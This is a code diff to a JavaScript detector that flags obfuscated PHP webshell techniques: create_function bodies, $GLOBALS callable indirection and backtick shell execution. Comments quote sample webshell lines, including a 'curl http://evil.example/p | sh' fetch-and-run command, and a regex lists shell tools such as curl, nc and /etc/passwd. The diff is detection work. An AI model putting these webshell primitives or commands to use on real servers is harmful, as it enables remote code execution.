@@ -145,6 +145,30 @@ function _phpBytesPreview(bytes) {
   return s;
 }
 
+// ── Deobfuscated-amp-ratio clip helper (32× raw / 8 KiB cap) ─────
+// Mirrors `_clipDeobfToAmpBudget` in cmd-obfuscation.js (25f2e66,
+// bc7d048). PHP1 / PHP3 / PHP6 can legitimately produce very large
+// previews: a 256 KiB base64 literal through gzinflate can expand
+// 10× to 20×; a 4 KiB pack(H*) hex string expands 2× to plaintext;
+// a data:;base64 carrier can embed a full script. Without a cap the
+// preview fills the sidebar and trips the fuzz invariant
+// `deobf > 32 * raw` (the per-shell obfuscation fuzz target enforces
+// this). We clamp to 8 KiB absolute / 32× raw with a `… [truncated]`
+// marker reserved inside the budget so clipped output never itself
+// trips the invariant.
+const _PHP_DEOBF_AMP_RATIO = 32;
+const _PHP_DEOBF_ABS_CAP   = 8 * 1024;
+const _PHP_DEOBF_TRUNC_MARK = '\u2026 [truncated]';
+function _phpClipDeobfToAmpBudget(deobf, raw) {
+  if (typeof deobf !== 'string' || deobf.length === 0) return deobf;
+  const rawLen = (typeof raw === 'string') ? raw.length : 0;
+  const cap = Math.min(_PHP_DEOBF_ABS_CAP, _PHP_DEOBF_AMP_RATIO * Math.max(1, rawLen));
+  if (deobf.length <= cap) return deobf;
+  const bodyLen = Math.max(0, cap - _PHP_DEOBF_TRUNC_MARK.length);
+  if (bodyLen === 0) return deobf.slice(0, cap);
+  return deobf.slice(0, bodyLen) + _PHP_DEOBF_TRUNC_MARK;
+}
+
 // Apply a chain of PHP decoder names (innermost-first) to a base64-decoded
 // byte buffer. Recognised: gzinflate, gzuncompress, gzdecode (gzip),
 // str_rot13 (text), convert_uudecode (text), hex2bin (text). Returns
@@ -264,6 +288,7 @@ Object.assign(EncodedContentDetector.prototype, {
       }
       const preview = _phpBytesPreview(final);
       if (!preview || preview.length < 2) continue;
+      const clippedPreview = _phpClipDeobfToAmpBudget(preview, raw);
       // Build the pretty technique string in INNER-FIRST call order.
       //
       // `chainNames` is already innermost-first (we reversed on line
@@ -291,7 +316,7 @@ Object.assign(EncodedContentDetector.prototype, {
         raw,
         offset: m.index,
         length: raw.length,
-        deobfuscated: preview,
+        deobfuscated: clippedPreview,
         _executeOutput: true,
       });
     }
@@ -391,7 +416,7 @@ Object.assign(EncodedContentDetector.prototype, {
         raw,
         offset: m.index,
         length: raw.length,
-        deobfuscated: s,
+        deobfuscated: _phpClipDeobfToAmpBudget(s, raw),
         _executeOutput: PHP_DANGEROUS_FNS.has(s),
       });
     }
@@ -416,7 +441,7 @@ Object.assign(EncodedContentDetector.prototype, {
         raw: m[0],
         offset: m.index,
         length: m[0].length,
-        deobfuscated: s,
+        deobfuscated: _phpClipDeobfToAmpBudget(s, m[0]),
         _executeOutput: PHP_DANGEROUS_FNS.has(s),
       });
     }
@@ -529,7 +554,140 @@ Object.assign(EncodedContentDetector.prototype, {
         raw: m[0],
         offset: m.index,
         length: m[0].length,
-        deobfuscated: preview,
+        deobfuscated: _phpClipDeobfToAmpBudget(preview, m[0]),
+        _executeOutput: true,
+      });
+    }
+
+    // ── PHP7: create_function('', $code) — legacy anonymous-fn RCE ──
+    //
+    //   $f = create_function('', 'system($_GET[0]);');
+    //   $f();
+    //
+    // PHP < 7.2 accepted a string body as the second arg and eval'd it
+    // internally — a direct RCE primitive. Deprecated in 7.2, removed
+    // in 8.0, but legacy webshells on EoL hosts still use it. PHP1
+    // already matches the `create_function('', base64_decode('…'))`
+    // carrier shape; this branch catches the *plaintext* body form
+    // (`create_function('', 'system($_GET[\'c\']);')`) that PHP1
+    // doesn't see because there's no `base64_decode`/`gzinflate` wrap.
+    //
+    // We require the body to contain a sensitive PHP keyword — a
+    // sanity gate against e.g. `create_function('', 'return $a+$b;')`
+    // which is legacy functional-programming style, not obfuscation.
+    const phpCreateFnRe = /\bcreate_function\s*\(\s*(['"])[^'"\r\n]{0,200}\1\s*,\s*(['"])((?:[^\\]|\\.){1,2000}?)\2\s*\)/g;
+    while ((m = phpCreateFnRe.exec(text)) !== null) {
+      throwIfAborted();
+      if (candidates.length >= this.maxCandidatesPerType) break;
+      const raw = m[0];
+      // Reconstruct a single-literal form so _dequotePhpLiteral can
+      // honour the matching quote style.
+      const bodyLit = m[2] + m[3] + m[2];
+      const body = _dequotePhpLiteral(bodyLit);
+      if (!body || body.length < 4) continue;
+      if (!SENSITIVE_PHP_KEYWORDS.test(body) && !this._bruteforce) continue;
+      const preview = `create_function \u2192 ${body}`;
+      candidates.push({
+        type: 'cmd-obfuscation',
+        technique: 'PHP create_function Legacy',
+        raw,
+        offset: m.index,
+        length: raw.length,
+        deobfuscated: _phpClipDeobfToAmpBudget(preview, raw),
+        _executeOutput: true,
+      });
+    }
+
+    // ── PHP8: $GLOBALS[...](...) callable-variable indirection ──
+    //
+    //   $GLOBALS['system']('whoami');                  ← direct
+    //   $GLOBALS['_GET'][0]($_POST['p']);              ← user-input dispatch
+    //   $GLOBALS['sys'.'tem']('id');                   ← concat (caught by gate)
+    //
+    // The `$GLOBALS` superglobal provides indirect access to every
+    // defined variable and function by name. Malware uses it to
+    // launder a callable through a lookup so static string scanners
+    // miss the dangerous function name. We accept two dispatch
+    // shapes: a key that resolves to a dangerous PHP function name,
+    // and a key that names another superglobal (`_GET`/`_POST`/etc,
+    // the user-input-dispatch primitive).
+    //
+    // Distinct from PHP5 (`$_GET[...]()`, `eval($_POST[...])`): PHP5
+    // matches bare-superglobal call sites; this branch matches only
+    // `$GLOBALS[...]`-keyed lookups, which the PHP5 regexes don't cover.
+    const phpGlobalsCallRe = /\$GLOBALS\s*\[\s*(['"])([A-Za-z_]\w{0,63})\1\s*\](?:\s*\[\s*[^\]]{0,80}\])?\s*\(\s*([^)]{0,400})\)/g;
+    while ((m = phpGlobalsCallRe.exec(text)) !== null) {
+      throwIfAborted();
+      if (candidates.length >= this.maxCandidatesPerType) break;
+      const name = m[2];
+      const isFn = PHP_DANGEROUS_FNS.has(name);
+      const isUserInputVar = /^_(?:GET|POST|REQUEST|COOKIE|SERVER|FILES)$/.test(name);
+      if (!isFn && !isUserInputVar && !this._bruteforce) continue;
+      const args = (m[3] || '').trim();
+      const resolved = isFn ? `${name}(${args})` : `$${name}[...](${args})`;
+      candidates.push({
+        type: 'cmd-obfuscation',
+        technique: 'PHP $GLOBALS Callable',
+        raw: m[0],
+        offset: m.index,
+        length: m[0].length,
+        deobfuscated: _phpClipDeobfToAmpBudget(resolved, m[0]),
+        _executeOutput: true,
+      });
+    }
+
+    // ── PHP9: backtick `…` shell-exec operator ──
+    //
+    //   $out = `whoami`;
+    //   echo `curl http://evil.example/p | sh`;
+    //   $u = `uname -a`;
+    //
+    // PHP's backtick operator is a direct alias for `shell_exec()` —
+    // a shell RCE primitive that many webshell scanners miss because
+    // it lacks a dangerous function name to grep. We require:
+    //
+    //   (1) a PHP document context — either `<?php` appears anywhere
+    //       earlier in the text, or a PHP sigil (`$var`, `echo`,
+    //       `print`, `<?=`, `<?`) appears within 200 chars before the
+    //       backtick. This defence rules out false positives in
+    //       Markdown, JS template literals (use lowercase backtick
+    //       but in different syntactic positions), and shell prompts.
+    //
+    //   (2) a shell-LOLBin vocabulary hit inside the backticked body.
+    //       SENSITIVE_PHP_KEYWORDS is the wrong gate here — it lists
+    //       PHP-native identifiers but backticks only run shell, so
+    //       we use a tighter shell-executable vocab (curl, wget, nc,
+    //       bash, sh, whoami, id, uname, cat /etc/, ps, netcat,
+    //       powershell, cmd).
+    const SHELL_LOLBIN_RE = /\b(?:whoami|uname|curl|wget|nc|netcat|bash|sh|dash|zsh|powershell|pwsh|cmd|cat|id|ps|ifconfig|ip\s+a|hostname|uname)\b|\/etc\/passwd|\/bin\/|\/usr\/bin\//;
+    const hasPhpContext = text.indexOf('<?') !== -1;
+    const phpBacktickRe = /(?:^|[\s;{(=])\x60([^\x60\r\n]{2,400})\x60/g;
+    while ((m = phpBacktickRe.exec(text)) !== null) {
+      throwIfAborted();
+      if (candidates.length >= this.maxCandidatesPerType) break;
+      const body = m[1];
+      // Locate the backtick itself — m.index points at the preceding
+      // delimiter (or 0 if start-of-string).
+      const backtickOff = text.indexOf('\x60', m.index);
+      if (backtickOff < 0) continue;
+      // Document-context gate. Without `<?` we require a local PHP
+      // sigil within 200 chars prior.
+      let contextOk = hasPhpContext;
+      if (!contextOk) {
+        const windowStart = Math.max(0, backtickOff - 200);
+        const priorWindow = text.slice(windowStart, backtickOff);
+        contextOk = /\$[A-Za-z_]\w*\s*=|<\?|\becho\b|\bprint\b/.test(priorWindow);
+      }
+      if (!contextOk) continue;
+      if (!SHELL_LOLBIN_RE.test(body) && !this._bruteforce) continue;
+      const preview = `shell_exec \u2192 ${body}`;
+      candidates.push({
+        type: 'cmd-obfuscation',
+        technique: 'PHP Backtick shell_exec',
+        raw: m[0],
+        offset: m.index,
+        length: m[0].length,
+        deobfuscated: _phpClipDeobfToAmpBudget(preview, m[0]),
         _executeOutput: true,
       });
     }
